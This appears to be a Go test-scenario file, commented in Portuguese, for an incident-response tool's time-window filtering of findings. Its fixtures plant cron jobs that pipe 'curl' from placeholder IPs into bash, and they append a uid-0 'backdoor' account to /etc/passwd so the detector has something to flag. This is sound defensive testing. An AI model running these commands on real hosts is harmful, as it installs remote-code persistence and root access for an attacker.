package scenario

// A janela de investigação (SPEC 6.5, runbook §9).
//
// Um host de dois anos tem centenas de coisas verdadeiras a dizer sobre si
// mesmo, e quase nenhuma pertence ao incidente. O recorte separa as duas — e os
// três cenários cobrem as três coisas que ele precisa fazer certo:
//
//	S1  o que está FORA sai do relatório, e o relatório DIZ que saiu
//	S2  o que não tem DATA fica, e o relatório diz por quê
//	S3  sem --since, a ferramenta deriva o âncora e declara que derivou

func init() {
	Register(Scenario{
		ID:   "S1-janela-recorta-e-declara",
		Desc: "dois agendamentos idênticos, um de 2020 e um de agora: a janela fica com o recente e CONTA o que cortou",
		// O mesmo comando suspeito nos dois arquivos, e a única diferença é o
		// mtime. É o recorte inteiro num par: sem a data, os dois seriam o
		// mesmo achado; com ela, um pertence ao incidente e o outro é história
		// do servidor.
		Images: matriz,
		Plant: `mkdir -p /etc/cron.d
			printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.7/a | bash"\n' > /etc/cron.d/zz-antigo
			printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.8/b | bash"\n' > /etc/cron.d/zz-recente
			touch -d '2020-01-01 00:00:00' /etc/cron.d/zz-antigo
			sleep 0.2`,
		Args: []string{"--since", "24h"},
		Expect: []Expect{
			{ID: "persist.cron_suspect", Sev: "CRITICAL", Subject: "zz-recente"},
		},
		// O que foi cortado precisa aparecer CONTADO, e o arquivo de 2020 não
		// pode aparecer como achado: as duas metades do contrato.
		ExpectOutput: []string{"FORA da janela", "1 CRITICAL"},
		ForbidOutput: []string{"zz-antigo"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "S2-sem-data-fica",
		Desc: "conta com uid 0 não tem mtime que a situe no tempo: a janela mais estreita do mundo não pode escondê-la",
		// A decisão que decide todo o resto. Uma conta com uid 0, uma regra de
		// sudo, um socket aberto agora: não há data que os coloque dentro ou
		// fora. Descartá-los junto com o que ficou fora seria esconder por
		// IGNORÂNCIA — e é a truncagem silenciosa que esta base persegue.
		Images: matriz,
		Plant: `printf 'backdoor:x:0:0:root:/root:/bin/bash\n' >> /etc/passwd
			sleep 0.2`,
		Args: []string{"--since", "1m"},
		Expect: []Expect{
			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "backdoor"},
		},
		ExpectOutput: []string{"SEM data foram MANTIDOS"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "S3-ancora-derivado",
		Desc: "sem --since, a ferramenta deriva o âncora do achado mais severo e DIZ que derivou",
		// O ovo-e-galinha da §9: a timeline precisa de um começo, e na primeira
		// execução não existe achado de onde tirá-lo. A regra é derivar do mais
		// severo — e nunca apresentar como derivado o que foi inventado.
		Images: []string{"debian:12"},
		Plant: `mkdir -p /etc/cron.d
			printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.7/a | bash"\n' > /etc/cron.d/zz-update
			sleep 0.2`,
		ExpectOutput: []string{"ÂNCORA", "derivado desta execução", "persist.cron_suspect"},
		Exit:         2,
		// Orçamento de ruído MEDIDO: o cron plantado é crítico; o aviso restante é medido.
		MaxWarn: 1,
	})
}
